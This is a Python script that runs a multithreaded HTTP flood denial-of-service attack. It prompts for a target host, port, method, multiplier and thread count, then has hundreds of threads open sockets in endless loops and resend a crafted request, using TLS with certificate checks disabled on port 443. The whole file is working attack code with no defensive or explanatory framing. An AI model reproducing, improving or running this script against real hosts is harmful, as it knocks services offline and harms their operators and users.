import random
import socket
import threading
import ssl
import requests

ip = str(input("Host/Ip:"))
port = int(input("Port:"))
protocol = str(input("Protocol(GET,POST,DELETE,HEAD):"))
multiple = int(input("Multiplier(100-300):"))
threads = int(input("Threads(600-800):"))

useragents = [""]
acceptall = [""]
ref = [""]
connection = ("Keep-Alive", random.randint(110,160))
content    = "Content-Type: application/x-www-form-urlencoded\r\n"
length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
go = threading.Event()

def run():
    useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
    accept    = random.choice(acceptall)
    referer   = "Referer: " +random.choice(ref) + ip + "\r\n"
    get_host = protocol + " /?=" + str(random.randint(0,2000)) + " HTTP/1.1\r\nHost: " + ip +":"+str(port)+ "\r\n"
    request  = get_host + useragent + accept + referer + content + length + "\r\n"
    go.wait()
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((str(ip), int(port)))
            print("[+] Sent " + " => " +str(ip)+ ":" +str(port))
            if str(port) == '443':
                s = ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE,ssl_version=ssl.PROTOCOL_SSLv23)
                try:
                    for x in range(multiple):
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                except:
                    s.close()
                    pass
            s.send(str.encode(request))
            s.send(str.encode(request))
            s.send(str.encode(request))
            s.send(str.encode(request))
            s.send(str.encode(request))
            s.send(str.encode(request))
            s.send(str.encode(request))
            s.send(str.encode(request))
            s.send(str.encode(request))
            s.send(str.encode(request))
            s.send(str.encode(request))
            s.send(str.encode(request))
            s.send(str.encode(request))
            s.send(str.encode(request))
            s.send(str.encode(request))
            s.send(str.encode(request))
            s.send(str.encode(request))
            s.send(str.encode(request))
            s.send(str.encode(request))
            s.send(str.encode(request))
            s.send(str.encode(request))
            s.send(str.encode(request))
            s.send(str.encode(request))
            s.send(str.encode(request))
            s.send(str.encode(request))
            s.send(str.encode(request))
            s.send(str.encode(request))
            s.send(str.encode(request))
            s.send(str.encode(request))
            s.send(str.encode(request))
        except:
            try:
                s.close()
            except:
                pass
 
for y in range(threads):
    th = threading.Thread (target=run)
    go.set()
    th.start()
